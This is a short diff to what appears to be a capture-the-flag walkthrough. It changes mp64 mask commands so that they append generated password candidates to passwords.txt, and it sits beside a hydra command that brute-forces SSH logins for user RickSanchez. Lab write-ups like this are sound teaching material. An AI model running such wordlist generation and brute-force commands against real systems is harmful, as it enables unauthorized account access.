@@ -215,10 +215,10 @@ cd /home/Summer
 touch passwords.txt
 ```
 ```bash
-mp64 ?u?dFles
+mp64 ?u?dFles >> passwords.txt
 ```
 ```bash
-mp64 ?u?dCurtains
+mp64 ?u?dCurtains >> passwords.txt
 ```
 ```bash
 hydra -l RickSanchez -P rick.txt ssh://< IP >:22222
